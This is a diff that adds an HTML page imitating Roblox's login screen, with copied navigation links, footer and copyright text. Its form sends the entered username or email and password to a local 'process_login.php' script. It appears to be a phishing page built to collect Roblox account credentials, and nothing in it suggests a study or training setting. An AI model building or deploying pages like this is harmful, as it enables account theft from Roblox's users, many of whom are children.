@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="r.png" rel="icon">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header class="navbar">
+        <div class="navbar-left">
+            <a href="#" class="roblox-logo">ROBLOX</a>
+            <a href="https://www.roblox.com/charts" target="_blank">Charts</a>
+            <a href="https://www.roblox.com/catalog?taxonomy=tZsUsd2BqGViQrJ9Vs3Wah&salesTypeFilter=1" target="_blank">Marketplace</a>
+            <a href="https://create.roblox.com/landing" target="_blank">Create</a>
+            <a href="https://www.roblox.com/upgrades/robux?ctx=navpopover" target="_blank">Robux</a>
+        </div>
+        <div class="navbar-center">
+            <input type="text" placeholder="Search">
+        </div>
+        <div class="navbar-right">
+            <button class="signup-btn">Sign Up</button>
+            <button class="login-btn">Log In</button>
+        </div>
+    </header>
+
+    <main class="login-container">
+    <div class="login-box">
+        <h1>Login to Roblox</h1>
+        
+        <form action="process_login.php" method="POST">
+            <input type="text" id="email" name="user_input" placeholder="Username/Email" class="input-field" required>
+            <input type="password" id="password" name="password_input" placeholder="Password" class="input-field" required>
+            
+            <p class="error-message" id="error-message"></p>
+
+            <button type="submit" class="log-in-btn">Log In</button>
+        </form>
+        <div class="forgot-section">
+            <a href="#">Forgot Password or Username?</a>
+        </div>
+
+            <div class="separator">
+                <hr>
+                <span class="login-with-text">login with</span>
+                <hr>
+            </div>
+
+            <button class="login-with-btn">Another Logged In Device</button>
+
+            <div class="signup-link">
+                <p>Don't have an account? <a href="#">Sign Up</a></p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <a href="#">About Us</a>
+        <a href="#">Jobs</a>
+        <a href="#">Blog</a>
+        <a href="#">Parents</a>
+        <a href="#">Buy Gift Cards</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Privacy</a>
+        <a href="#">Your Privacy Choices 🛡️</a>
+        <a href="#">Sitemap</a>
+        <p class="copyright">©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
